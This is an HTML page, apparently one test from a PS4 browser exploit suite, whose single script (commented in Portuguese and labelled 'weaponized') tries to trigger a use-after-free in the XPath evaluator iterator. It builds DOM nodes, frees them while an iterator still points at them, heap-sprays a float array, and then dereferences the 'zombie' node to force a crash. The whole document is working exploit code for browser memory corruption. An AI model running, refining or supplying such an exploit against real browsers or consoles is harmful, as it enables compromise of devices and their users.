
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 </title>
</head>
<body>

<h1>SUITE V70000: MAX CAPACITY</h1>
<hr>


    
<button onclick="t35_weaponized()">35. XPath Evaluator Iterator Invalid</button>

    

<script>

    
    function t35_weaponized() {
    log("Iniciando XPath Iterator UAF (Armado)...");
    
    // 1. Cria um container isolado (para não apagar seus botões)
    const sandbox = document.createElement('div');
    // Cria uma estrutura profunda para o iterador percorrer
    sandbox.innerHTML = "<div><span><b><i>ALVO</i></b></span></div>".repeat(500);
    document.body.appendChild(sandbox);

    // 2. Cria o iterador apontando para elementos DENTRO do sandbox
    // XPath procura por todas as tags <i>
    const r = document.evaluate("//i", sandbox, null, XPathResult.UNORDERED_NODE_ITERATOR_TYPE, null);
    
    // Avança um pouco para "aquecer" o iterador
    let node = r.iterateNext(); 
    
    // 3. O GATILHO: Destruição total do alvo
    // Remove o sandbox do DOM
    sandbox.remove();
    // Limpa o HTML para forçar o Garbage Collector a marcar os nós como livres
    sandbox.innerHTML = ""; 
    
    // 4. HEAP SPRAY (Tenta sobrescrever a memória que acabou de ser liberada)
    // Se o iterador ainda apontar para o endereço antigo, ele agora apontará para este array
    const spray = new Array(50000).fill(1.1); // Float arrays são ótimos para isso
    
    try {
        // 5. O ACESSO: Tenta avançar o iterador em uma árvore morta e sobrescrita
        const zombie = r.iterateNext();
        
        if (zombie) {
            // Se retornou algo, tentamos acessar propriedades para causar o Segfault
            log("PERIGO: Iterador retornou um nó Zumbi!");
            log("Conteúdo: " + zombie.textContent); // <--- Aqui deve dar Crash se for UAF
            zombie.textContent = "Crash"; 
        } else {
            log("Iterador invalidado com segurança (Retornou null).");
        }
    } catch(e) {
        // Se der erro de JS, o navegador se protegeu
        log("Browser Safe: " + e.message);
    }
}
        
        
    
    
</script>
</body>
</html>



